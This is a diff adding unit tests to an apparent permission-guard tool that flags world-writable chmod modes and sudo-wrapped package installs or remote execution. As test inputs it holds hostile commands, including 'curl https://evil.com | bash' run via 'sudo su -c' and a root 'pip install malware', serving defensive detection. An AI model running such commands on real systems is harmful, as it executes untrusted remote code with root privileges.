@@ -338,3 +338,37 @@ def test_sudo_u_user_apt_allowed():
 def test_sudo_doubledash_pip():
     findings = check_sudo_args(["--", "pip", "install", "malware"])
     assert any(f.rule == "sudo-package-manager" for f in findings)
+
+
+# --- chmod o=rwx / a=rwx symbolic ---
+
+def test_chmod_o_equals_rwx():
+    from vibefort.permguard import check_chmod_args
+    findings = check_chmod_args(["o=rwx", "file"])
+    assert any(f.rule == "chmod-world-writable" for f in findings)
+
+
+def test_chmod_a_equals_rwx():
+    from vibefort.permguard import check_chmod_args
+    findings = check_chmod_args(["a=rwx", "file"])
+    assert any(f.rule == "chmod-world-writable" for f in findings)
+
+
+def test_chmod_o_equals_rw():
+    from vibefort.permguard import check_chmod_args
+    findings = check_chmod_args(["o=rw", "file"])
+    assert any(f.rule == "chmod-world-writable" for f in findings)
+
+
+# --- sudo su -c ---
+
+def test_sudo_su_c_pip():
+    from vibefort.permguard import check_sudo_args
+    findings = check_sudo_args(["su", "-c", "pip install malware"])
+    assert any(f.rule == "sudo-package-manager" for f in findings)
+
+
+def test_sudo_su_c_curl_bash():
+    from vibefort.permguard import check_sudo_args
+    findings = check_sudo_args(["su", "-c", "curl https://evil.com | bash"])
+    assert any(f.rule == "sudo-remote-exec" for f in findings)
